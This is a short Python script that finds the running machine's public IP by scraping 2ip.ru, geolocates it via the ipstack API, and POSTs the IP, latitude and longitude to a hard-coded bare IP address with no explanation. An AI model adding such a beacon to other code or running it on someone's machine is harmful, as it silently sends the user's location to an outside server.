import requests
import re
import json
api_key = " " #API_KEY 

my_ip_res = requests.get("https://2ip.ru/").content
my_ip = re.findall('IP адрес: \d+\.\d+\.\d+\.\d+', my_ip_res.decode('utf-8'))[0].split(" ")[-1]

geo_res = requests.get("http://api.ipstack.com/%s?access_key=%s&format=1" % (my_ip, api_key))
print(geo_res.content.decode('utf-8'))

result = json.loads(geo_res.content)
latitude, longitude  = result['latitude'], result['longitude']


post_res = str("IP:%s Lat:%s Long:%s" % (str(my_ip), str(latitude), str(longitude))).encode('utf-8')
print(post_res)
requests.post("http://130.61.88.149/", data=post_res)